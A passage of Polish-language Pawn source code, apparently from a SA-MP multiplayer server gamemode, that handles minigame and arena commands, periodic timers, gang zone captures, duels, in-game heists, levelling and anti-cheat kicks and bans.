	if(Wystartowala[DB]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[DB] >= Max[DB]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == DB) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = DB;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/DB"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:gungame(playerid, params[]) return cmd_gg(playerid, params);
CMD:gg(playerid, params[])
{
	if(!Startuje[GG]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[GG]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[GG] >= Max[GG]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == GG) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = GG;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/GG"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:bd(playerid, params[])
{
	if(!Startuje[BD]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[BD]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[BD] >= Max[BD]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == BD) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = BD;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/BD"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	SendClientMessage(playerid, RED, zipstr);
	RefreshZabawy();
	return 1;
}

CMD:tr(playerid, params[])
{
	if(!Startuje[TR]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[TR]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[TR] >= Max[TR]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == TR) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = TR;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/TR"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	RefreshZabawy();
	SendClientMessage(playerid, RED, zipstr);
	return 1;
}

CMD:ba(playerid, params[])
{
	if(!Startuje[BA]) return SendClientMessage(playerid, RED, "Zapisy nie s¹ w trakcie trwania.");
	if(Wystartowala[BA]) return SendClientMessage(playerid, RED, "Zabawa ju¿ wystartowa³a.");
	if(Osoby[BA] >= Max[BA]) return SendClientMessage(playerid, RED, "Na zabawê zapisa³a siê maksymalna liczba osób.");
	if(OnGame[playerid] == BA) return SendClientMessage(playerid, RED, "Jesteœ ju¿ zapisany na t¹ zabawê.");
	if(OnGame[playerid] != -1) { WypiszZabawa(playerid); }
	OnGame[playerid] = BA;
	new zipstr[256];
	format(zipstr, sizeof(zipstr), ""C_GREEN"Zosta³eœ zapisany na zabawê "C_WHITE"/BA"C_GREEN". Oczekuj na jej start.");
	SendClientMessage(playerid, -1, zipstr);
	format(zipstr, sizeof(zipstr), "Uzyj "C_WHITE"/leave "C_RED"w celu wypisania siê z zabawy.");
	RefreshZabawy();
	SendClientMessage(playerid, RED, zipstr);
	return 1;
}

CMD:os(playerid, params[]) return cmd_de(playerid, params);
CMD:onede(playerid, params[]) return cmd_de(playerid, params);
CMD:de(playerid, params[])
{
    if(SpawnTimer[playerid] > 0) SendClientMessage(playerid, RED, "Posiadasz ochronê anty spawn kill.");
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 1;
 	SetPlayerHealth(playerid, 15);
  	TeleportToArena(playerid);
  	OsobyA[0]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/de{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:lk(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 2;
  	TeleportToArena(playerid);
  	OsobyA[1]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/lk{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:tb(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 3;
  	TeleportToArena(playerid);
  	OsobyA[2]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/tb{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:ga(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 4;
  	TeleportToArena(playerid);
  	OsobyA[3]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/ga{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:sb(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 5;
  	TeleportToArena(playerid);
  	OsobyA[4]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/sb{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:sh(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 6;
  	TeleportToArena(playerid);
  	OsobyA[5]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/sh{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:sn(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 7;
  	TeleportToArena(playerid);
  	OsobyA[6]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/sn{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

CMD:rpg(playerid, params[])
{
 	ResetPlayerWeapons(playerid);
	pArena[playerid] = 8;
  	TeleportToArena(playerid);
  	OsobyA[7]++;
	new arenast[256];
	format(arenast, sizeof(arenast), ""PYTAJNIK""C_NICK"%s(%d) {709fea}do³¹czy³ do areny "C_YELLOW"/rpg{709fea}. Do³¹cz i Ty!", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, arenast);
	RefreshAreny();
	return 1;
}

forward MinuteTimer();
public MinuteTimer()
{
	gettime(hour, minute, second);
	if(LastMinute == minute) return 1;
	LastMinute = minute;
	getdate(year, month, day);
	new strr[256];
	format(strr, sizeof(strr), "~w~~h~%02d~b~~h~:~w~~h~%02d %02d~b~~h~.~w~~h~%02d~b~~h~.~w~~h~%d", hour, minute, day, month, year);
	TextDrawSetString(Textdraw[16], strr);
	if(hour == 0 && minute == 0) {
	    daily = 0;
	   	daily = gracze;
	   	new str[256];
	   	format(str, sizeof(str), "Dzisiejszy rekord graczy! ("C_BLUE1"%d"C_WHITE")", daily);
	   	SendClientMessageToAll(-1, str);
		SaveClans();
		SavePrivcars(); }
	if(ServerEvent && SEventTimer > 0) {
	    SEventTimer--;
		new formatse[256];
		format(formatse, sizeof(formatse), "Event serwera~n~~w~~h~%s~n~~w~~h~Pozostalo ~p~%d ~w~~h~minut", SEventName, SEventTimer);
		TextDrawSetString(Textdraw[10], formatse);
	    if(SEventTimer == 0) {
	        ServerEvent = false;
	        if(SEventType == 5) {
	            SEventType = -1;
				RespawnPokemons(); }
	        if(SEventType != 5) SEventType = -1;
	        Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid) && TDOn[playerid]) HideSEvent(playerid); } } }
	Loop(x, MAX_PLAYERS)
	{
    if(strlen(Player[x][Email]) < 4 && Player[x][IsLoggedIn]) {
        SendClientMessage(x, RED, ""C_WHITE"Wygl¹da na to, ¿e nie poda³eœ swojego adresu e-mail. Prosimy o dodanie go w "C_RED"/mail"C_WHITE".");
        SendClientMessage(x, RED, ""C_WHITE"U³atwi to odzyskanie Twojego konta po utracie has³a."); }
		if(!AFK[x])
		{
	    	if(Player[x][HasRealTime]) SetPlayerTime(x, hour, minute);
	    	if(zw[x] > 0) zwTimer[x]++;
			if(Player[x][IsLoggedIn] && zw[x] < 1 && AFKPoints[x] > 0) {
		    	CheckAch(x);
				pMinutes[x]++;
				Player[x][Minutes]++;
				if(pMinutes[x] > 59) {
		    		pHours[x]++;
 		   			AddExp(x, 500);
					SendClientMessage(x, GREEN, ""PLUS""C_LOLIVE"Dosta³eœ/aœ {f70000}500 "C_LOLIVE"EXP za godzinê gry na serwerze.");
          if(pHours[x] >= 3) SendClientMessage(x, RED, "{FF0000}Zalecamy zrobienie krótkiej przerwy od gry. Ci¹g³a gra jest mêcz¹ca.");
		    		pMinutes[x] = 0; }
				CheckHours(x); }
			if(Player[x][Admin] == 4)
			{
    	   		if(GetPVarInt(x,"SupportInfo") < gettime())
    	   		{
    				SetPVarInt(x,"SupportInfo",gettime()+300);
					m_query("SELECT * FROM support WHERE status = 0");
					mysql_store_result();
					new tickety = mysql_num_rows();
					if(tickety > 0) SendClientMessage(x, -1, ""PYTAJNIK" {0635D1}W supporcie znajduj¹ siê tematy, na które nie udzielono odpowiedzi. SprawdŸ "C_WHITE"/support{0635D1}.");
					mysql_free_result();
				}
			}
   	   		if(GetPVarInt(x,"SupportPInfo") < gettime())
       		{
    			SetPVarInt(x,"SupportPInfo",gettime()+300);
				m_query("SELECT * FROM support WHERE status = 1 && suid = %d", Player[x][ID]);
				mysql_store_result();
				new tickety = mysql_num_rows();
				if(tickety > 0) SendClientMessage(x, -1, ""PYTAJNIK" {0635D1}W supporcie znajduj¹ siê Twoje tematy, na które udzielono odpowiedzi. "C_WHITE"/support{0635D1}.");
				mysql_free_result();
			}
		}
	}
	m_query("UPDATE serverstats SET connects = %d, daily = %d, record = %d, kicks = %d, bans = %d, eq = %d, pokemons = %d", connects, daily, record, kicks, bans, eq, pokemons);
	ZonesReward();
    return 1;
}

forward Unjail(playerid);
public Unjail(playerid) {
   	SetPlayerVirtualWorld(playerid, 0);
    if(IsSpec[playerid]) SpecToggle(playerid, false);
	SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Wracasz na wolnoœæ!");
	PlayerTextDrawHide(playerid, JailTime[playerid]);
	JailTimeP[playerid] = 0;
	SpawnPlayer(playerid);
	SpawnFunction(playerid); }

forward CheckAnn();
public CheckAnn()
{
	if(AnnTimer > 1) return AnnTimer--;
	if(AnnTimer == 1) {
	    AnnTimer--;
		return TextDrawHideForAll(Ann); }
	return 1;
}

forward NextSound(playerid);
public NextSound(playerid) PlayerPlaySound(playerid,1139,0.0,0.0,0.0);

forward StartGangZoneAttack(gangid, zoneid);
public StartGangZoneAttack(gangid, zoneid)
{
	gzAttacker[zoneid] = gangid;
	gzTimer[zoneid] = 90;
	Loop(playerid, MAX_PLAYERS) {
	    if(IsPlayerConnected(playerid) && Player[playerid][Gang] == gangid) {
	        new gangstrinfo[256];
	        format(gangstrinfo, sizeof(gangstrinfo), "{34ed87}Twój klan rozpocz¹³ przejmowanie sektora dzielnicowego "C_WHITE"%d{34ed87}.", zoneid);
	        SendClientMessage(playerid, -1, gangstrinfo);
			Sound(playerid,1137,0.0,0.0,0.0); } }
  	if(gColor[gangid] == 0) GangZoneFlashForAll(gZZone[zoneid], GREY);
	if(gColor[gangid] == 1) GangZoneFlashForAll(gZZone[zoneid], GREEN);
	if(gColor[gangid] == 2) GangZoneFlashForAll(gZZone[zoneid], RED);
	if(gColor[gangid] == 3) GangZoneFlashForAll(gZZone[zoneid], YELLOW);
	if(gColor[gangid] == 4) GangZoneFlashForAll(gZZone[zoneid], BLUE);
	if(gColor[gangid] == 5) GangZoneFlashForAll(gZZone[zoneid], ORANGE);
	if(gColor[gangid] == 6) GangZoneFlashForAll(gZZone[zoneid], MAGENTA);
	if(gColor[gangid] == 7) GangZoneFlashForAll(gZZone[zoneid], AQUA);
	if(gColor[gangid] == 8) GangZoneFlashForAll(gZZone[zoneid], GOLD);
	if(gColor[gangid] == 9) GangZoneFlashForAll(gZZone[zoneid], SEAGREEN);
	if(gColor[gangid] == 10) GangZoneFlashForAll(gZZone[zoneid], OLIVE);
	if(gColor[gangid] == 11) GangZoneFlashForAll(gZZone[zoneid], SPRINGGREEN);
	if(gColor[gangid] == 12) GangZoneFlashForAll(gZZone[zoneid], MAROON);
	if(gColor[gangid] == 13) GangZoneFlashForAll(gZZone[zoneid], LIME);
	if(gColor[gangid] == 14) GangZoneFlashForAll(gZZone[zoneid], MEDIUMAQUA);
	if(gColor[gangid] == 15) GangZoneFlashForAll(gZZone[zoneid], MEDIUMMAGENTA);
	return 1;
}

forward ZonesReward();
public ZonesReward()
{
	Loop(klany, MAX_GANGS)
	{
	    new klanzony = 0;
		Loop(zony, gangzones) if(gzOwner[zony] == klany) klanzony++;
		if(klanzony > 0)
		{
		    new zoneexp;
		    zoneexp = klanzony * 2;
		    gScore[klany] += zoneexp;
			Loop(playerid, MAX_PLAYERS) {
	    		if(IsPlayerConnected(playerid) && Player[playerid][Gang] == klany) {
	        		new gangstrinfo[256];
	        		format(gangstrinfo, sizeof(gangstrinfo), "{34ed87}Respekt klanu oraz Twój EXP zwiêkszony o "C_WHITE"%d{34ed87} za posiadanie "C_WHITE"%d {34ed87}sektorów dzielnicowych.", zoneexp, klanzony);
	        		SendClientMessage(playerid, -1, gangstrinfo);
	        		AddExp(playerid, zoneexp);
					Sound(playerid,1138,0.0,0.0,0.0); } }
		}
	}
}

forward CheckZone(zoneid);
public CheckZone(zoneid)
{
	new ludzie = 0;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(IsPlayerInArea(playerid, gzmiX[zoneid], gzmiY[zoneid], gzmaX[zoneid], gzmaY[zoneid]))
 		{
     		if(Player[playerid][Gang] != gzOwner[zoneid] && gzAttacker[zoneid] == -1) {
				ludzie++;
		       	if(ludzie > 0 && gzAttacker[zoneid] != Player[playerid][Gang] && gzTimer[zoneid] == 0) return StartGangZoneAttack(Player[playerid][Gang], zoneid); }
	   	}
	}
	ludzie = 0;
	Loop(playerid, MAX_PLAYERS) {
	    if(IsPlayerInArea(playerid, gzmiX[zoneid], gzmiY[zoneid], gzmaX[zoneid], gzmaY[zoneid])) {
     		if(Player[playerid][Gang] == gzAttacker[zoneid] && gzAttacker[zoneid] != -1) ludzie++; } }
   	if(ludzie < 1 && gzTimer[zoneid] > 0) {
     	GangZoneStopFlashForAll(gZZone[zoneid]);
    	gzAttacker[zoneid] = -1;
	  	return gzTimer[zoneid] = 0; }
	ludzie = 0;
	Loop(playerid, MAX_PLAYERS) {
		if(IsPlayerInArea(playerid, gzmiX[zoneid], gzmiY[zoneid], gzmaX[zoneid], gzmaY[zoneid])) {
		    if(gzAttacker[zoneid] == Player[playerid][Gang]) ludzie++; } }
  	if(ludzie < 1 && gzTimer[zoneid] > 0) {
  		GangZoneStopFlashForAll(gZZone[zoneid]);
   		gzAttacker[zoneid] = -1;
    	return gzTimer[zoneid] = 0; }
  	if(ludzie > 0 && gzTimer[zoneid] > 0) {
		gzTimer[zoneid]--;
		if(gzTimer[zoneid] == 0) {
		    GangZoneStopFlashForAll(gZZone[zoneid]);
		    GangZoneHideForAll(gZZone[zoneid]);
		   	gzOwner[zoneid] = gzAttacker[zoneid];
		   	gzAttacker[zoneid] = -1;
	 		new owner = gzOwner[zoneid];
			if(gColor[owner] == 0) GangZoneShowForAll(gZZone[zoneid], GREY);
			if(gColor[owner] == 1) GangZoneShowForAll(gZZone[zoneid], GREEN);
			if(gColor[owner] == 2) GangZoneShowForAll(gZZone[zoneid], RED);
			if(gColor[owner] == 3) GangZoneShowForAll(gZZone[zoneid], YELLOW);
			if(gColor[owner] == 4) GangZoneShowForAll(gZZone[zoneid], BLUE);
			if(gColor[owner] == 5) GangZoneShowForAll(gZZone[zoneid], ORANGE);
			if(gColor[owner] == 6) GangZoneShowForAll(gZZone[zoneid], MAGENTA);
			if(gColor[owner] == 7) GangZoneShowForAll(gZZone[zoneid], AQUA);
			if(gColor[owner] == 8) GangZoneShowForAll(gZZone[zoneid], GOLD);
			if(gColor[owner] == 9) GangZoneShowForAll(gZZone[zoneid], SEAGREEN);
			if(gColor[owner] == 10) GangZoneShowForAll(gZZone[zoneid], OLIVE);
			if(gColor[owner] == 11) GangZoneShowForAll(gZZone[zoneid], SPRINGGREEN);
			if(gColor[owner] == 12) GangZoneShowForAll(gZZone[zoneid], MAROON);
			if(gColor[owner] == 13) GangZoneShowForAll(gZZone[zoneid], LIME);
			if(gColor[owner] == 14) GangZoneShowForAll(gZZone[zoneid], MEDIUMAQUA);
			if(gColor[owner] == 15) GangZoneShowForAll(gZZone[zoneid], MEDIUMMAGENTA);
			GiveClanAchievement(owner, 2);
			Loop(playerid, MAX_PLAYERS) {
	    		if(IsPlayerConnected(playerid) && Player[playerid][Gang] == owner) {
	        		new gangstrinfo[256];
	        		format(gangstrinfo, sizeof(gangstrinfo), "{34ed87}Twój klan przej¹³ sektor dzielnicowy "C_WHITE"%d{34ed87}.", zoneid);
	        		SendClientMessage(playerid, -1, gangstrinfo);
					Sound(playerid,1138,0.0,0.0,0.0); } } } }
	return 1;
}

forward CheckSolo(playerid);
public CheckSolo(playerid) {
	if(pFight[playerid])
	{
	    new Float:x, Float:y, Float:z;
	    GetPlayerPos(playerid, x, y, z);
	    if(z > 999) return 1;
	    pFight[playerid] = false;
	    Loop(loopid, MAX_PLAYERS)
	    {
	        if(pEnemy[loopid] == playerid && IsPlayerConnected(loopid))
	        {
	   			SetPlayerInterior(playerid, 0);
	   			SetPlayerInterior(loopid, 0);
	   			SetPlayerVirtualWorld(playerid, 0);
	   			SetPlayerVirtualWorld(loopid, 0);
	    		pFight[loopid] = false;
	    		pEnemy[loopid] = -1;
	    		pEnemy[playerid] = -1;
	    		pFight[playerid] = false;
	    		AddExp(loopid, 30);
	    		Player[playerid][Exp] -= 10;
	    		if(Player[playerid][Exp] < 0) Player[playerid][Exp] = 0;
	    		Player[loopid][Solo]++;
	    		new solomsg[256], solomsgen[256];
	    		format(solomsg, sizeof(solomsg), ""C_NICK"%s(%d) {CCFF33}wygrywa pojedynek solo z "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
	    		format(solomsgen, sizeof(solomsgen), ""C_NICK"%s(%d) {CCFF33}won solo battle with "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
				SendClientMessageToAllEx(-1, solomsg, solomsgen);
				SetPlayerHealth(playerid, 100.0);
				SetPlayerArmour(playerid, 100.0);
				SetPlayerHealth(loopid, 100.0);
				SetPlayerArmour(loopid, 100.0);
				SpawnFunction(loopid);
				SpawnFunction(playerid);
	        }
		}
	}
	return 1;
}

forward CheckNapady();
public CheckNapady() {
	Loop(x, MAX_NAPADY) {
	    if(NapadTime[x] > 0) NapadTime[x]--;
	    if(NapadTime[x] == 0) {
	        NapadTime[x] = -1;
			new atakujacy = Atakuje[x];
			new nistr[256];
			format(nistr, sizeof(nistr), "Napad udany! Otrzymujesz {6efc58}%d "C_WHITE"EXP oraz %d{6efc58}$"C_WHITE".", NValue[x], NValue[x] * 10);
	        SendClientMessage(atakujacy, -1, nistr);
         	Loop(playerid, MAX_PLAYERS) {
			 	if(NapadID[playerid] == x) NapadID[playerid] = -1; }
	        NapadTime[x] = -1;
	        AddExp(atakujacy, NValue[x]);
	        Player[atakujacy][Cash] += NValue[x] * 10;
			Atakuje[x] = -1; } } }

forward NapadTDref();
public NapadTDref() {
	new napadytrwajace = 0, strnapad[1024];
	TrwajaceNapady = napadytrwajace;
	format(strnapad, sizeof(strnapad), "Trwajace napady~n~");
	if(TrwajaceNapady > 0) {
		Loop(napady, napadytrwajace) {
	    	if(NapadTime[napadytrwajace] > 0 && NapadID[napadytrwajace] > -1) format(strnapad, sizeof(strnapad), "%s~w~~h~%s (%ds)~n~", strnapad, NapadName[napadytrwajace], NapadTime[napadytrwajace]); } }
	TextDrawSetString(Textdraw[19], strnapad);
}

forward SecondTimer(); 
public SecondTimer()
{
	if(LastSecond == gettime()) return 1;
	LastSecond = gettime();
	if(AnnTimer > 0) CheckAnn();
	Loop(playerid, MAX_PLAYERS)
	{
	  WeaponsH(playerid);
      new Float:x, Float:y, Float:z;
      GetPlayerPos(playerid, x, y, z);
      if(LastX[playerid] == x && LastY[playerid] == y && LastZ[playerid] == z) {
        AFKPoints[playerid]--;
        if(AFKPoints[playerid] <= 0) {
			AFKPoints[playerid] = 0;
        	if(OnGame[playerid] != -1) {
          	new cgameid = OnGame[playerid];
          	if(!Wystartowala[cgameid]) WypiszZabawa(playerid); } } }
	    UpdateLicznik(playerid);
 		pPing[playerid] = GetPlayerPing(playerid);
	    if(AFKPoints[playerid] > 0) {
	     	new tdstrr[256];
 			format(tdstrr, sizeof(tdstrr), "%d ~w~~h~%s", playerid, Player[playerid][Name]);
			PlayerTextDrawSetString(playerid, Nick[playerid], tdstrr);
 			format(tdstrr, sizeof(tdstrr), "EXP: ~w~~h~%d", Player[playerid][Exp]);
			PlayerTextDrawSetString(playerid, ExpTD[playerid], tdstrr);
 			format(tdstrr, sizeof(tdstrr), "Grasz: ~w~~h~%dh %02dm", pHours[playerid], pMinutes[playerid]);
			PlayerTextDrawSetString(playerid, Grasz[playerid], tdstrr);
 			format(tdstrr, sizeof(tdstrr), "FPS: ~w~~h~%d", pFPS[playerid]);
			PlayerTextDrawSetString(playerid, FPSTD[playerid], tdstrr);
 			format(tdstrr, sizeof(tdstrr), "Ping: ~w~~h~%d", pPing[playerid]);
			PlayerTextDrawSetString(playerid, PingTD[playerid], tdstrr);
 			format(tdstrr, sizeof(tdstrr), "Level: ~w~~h~%d", Player[playerid][Level]);
			PlayerTextDrawSetString(playerid, LevelTD[playerid], tdstrr);
 			format(tdstrr, sizeof(tdstrr), "Portfel: ~w~~h~%d zl", Player[playerid][vCash]);
			PlayerTextDrawSetString(playerid, PortfelTD[playerid], tdstrr);
			new Float:kami;
			GetPlayerArmour(playerid, kami);
 			format(tdstrr, sizeof(tdstrr), "%.0f%", kami);
			PlayerTextDrawSetString(playerid, Kamizelka[playerid], tdstrr);
			new Float:hp;
			GetPlayerHealth(playerid, hp);
 			format(tdstrr, sizeof(tdstrr), "%.0f%", hp);
			PlayerTextDrawSetString(playerid, HPTD[playerid], tdstrr); }
	    if(PlayerSpamCount[playerid] > 0) PlayerSpamCount[playerid]--;
	    if(NapadID[playerid] > -1)
	    {
	        new napad = NapadID[playerid];
	    	if(!IsPlayerInRangeOfPoint(playerid, 6.5, NX[napad], NY[napad], NZ[napad])) {
 			    NapadID[playerid] = -1;
 			    NapadTime[napad] = -1;
				SendClientMessage(playerid, RED, "Twój napad zosta³ przerwany."); }
		}
		if(SpawnTimer[playerid] > 0) {
			SpawnTimer[playerid]--;
			if(SpawnTimer[playerid] == 0) {
				if(pArena[playerid] != 1) SetPlayerHealth(playerid, 100.0);
				else SetPlayerHealth(playerid, 15.0); } }
	    if(Player[playerid][IsLoggedIn])
	    {
            pVehicles[playerid] = 0;
	        if(Player[playerid][Exp] > 1000000) {
	            Player[playerid][Exp] = 1000000;
	            SendClientMessage(playerid, RED, "Osi¹gn¹³eœ maksymaln¹ iloœæ EXP. Przenieœ czêœæ swojego EXP do banku."); }
          if(Player[playerid][Cash] > 999999998) Player[playerid][Cash] = 999999999;
      if(GetPVarInt(playerid,"SaVIP") < gettime() && Player[playerid][CPick] < 8 && Player[playerid][Vip] > gettime() && !HavePrivcar[playerid]) {
        Loop(partid, MAX_PARTS) {
          if(IsPlayerInRangeOfPoint(playerid, 150.0, partX[partid], partY[partid], partZ[partid]) && POnMap[partid])
          {
            PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
            SetTimerEx("NextSound", 500, 0, "i", playerid);
            SetPVarInt(playerid,"SaVIP",gettime()+30); } } }
			if(pPing[playerid] > 400 && GetPVarInt(playerid,"PingCheck") < gettime()) {
				SetPVarInt(playerid,"PingCheck",gettime()+15);
			    PingLimit[playerid]++;
			    SendClientMessage(playerid, RED, "{FF0000}Przekraczasz maksymalny, dopuszczalny ping! Postaraj siê go zmniejszyæ.");
			    if(PingLimit[playerid] >= 3) {
			   		new msgs[256];
					format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Niestabilne po³¹czenie"C_RED")", Player[playerid][Name], playerid);
 					SendClientMessageToAll(WHITE, msgs);
					DelayedKick(playerid);
					return kicks++; } }
			new templevel = Player[playerid][Exp] / 1000 + 1;
			if(templevel > Player[playerid][Level]) {
		    	Player[playerid][Level] = templevel;
		    	new levelmsg[256];
		    	format(levelmsg, sizeof(levelmsg), "{39F98C}Gratulacje! Osi¹gn¹³eœ "C_WHITE"%d {39F98C}poziom!", Player[playerid][Level]);
		    	if(Player[playerid][Level] < 90) AddExp(playerid, 10 * Player[playerid][Level]);
		    	SendClientMessage(playerid, -1, levelmsg);
				if(templevel >= 100 && !Player[playerid][Bonus]) {
					SendClientMessage(playerid, -1, ""C_YELLOW"Przed³u¿ono uprawnienia VIP o "C_WHITE"365 "C_YELLOW"dni.");
					if(Player[playerid][Vip] > gettime()) Player[playerid][Vip] = Player[playerid][Vip] + 86400 * 365;
					else Player[playerid][Vip] = gettime() + 86400 * 365;
					Player[playerid][Bonus] = true; } }
			new Float:hp;
			GetPlayerHealth(playerid, hp);
			new Float:armor;
			GetPlayerArmour(playerid, armor);
		    if(Player[playerid][IsLoggedIn])
		    {
	        	SetPlayerMoney(playerid, Player[playerid][Cash]);
	        	SetPlayerScore(playerid, Player[playerid][Exp]);
			}

      if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK) {
        if(gettime() > Player[playerid][Vip] && Player[playerid][Admin] < 1 && !LoggedOnVip[playerid]) {
          new plrIP[16], msgs[256];
          GetPlayerIp(playerid, plrIP, sizeof(plrIP));
            format(msgs, sizeof(msgs), ""C_NICK"Serwer "C_RED"czasowo zbanowa³ gracza "C_NICK"%s(%d) "C_RED"("C_WHITE"7d, Jetpack"C_RED")", Player[playerid][Name], playerid);
          SendClientMessageToAll(RED, msgs);
          SendClientMessage(playerid, RED, "Uwa¿asz, ¿e na³o¿ona kara jest nies³uszna? Z³ó¿ apelacjê na naszym forum: "C_WHITE""FORUM""C_RED".");
          m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', 'Serwer', 'Jetpack', 0, %d)", Player[playerid][ID], gettime(), plrIP, gettime() + 86400 * 7);
          DelayedKick(playerid);
          bans++; } }
 			if(GetPlayerWeapon(playerid) != 24 && isCbug[playerid] == 1)
			{
 				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerHealth(playerid, 100.0);
				SpawnPlayer(playerid);
				SpawnFunction(playerid);
				isCbug[playerid] = 0;
			}
			if(!DJHear[playerid] && IsPlayerInRangeOfPoint(playerid, 30.0, -314.0115,1764.9315,43.9387) && DJPlaying) {
	    		DJHear[playerid] = true;
	    		PlayAudioStreamForPlayer(playerid, DJMusic, -314.0115,1764.9315,43.9387, 30.0, 1); }
			if(DJHear[playerid] && !IsPlayerInRangeOfPoint(playerid, 30.0, -314.0115,1764.9315,43.9387)) {
	    		StopAudioStreamForPlayer(playerid);
	    		DJHear[playerid] = false; }
		}
 	    Loop(arrowsid, MAX_ARROWS)
	    {
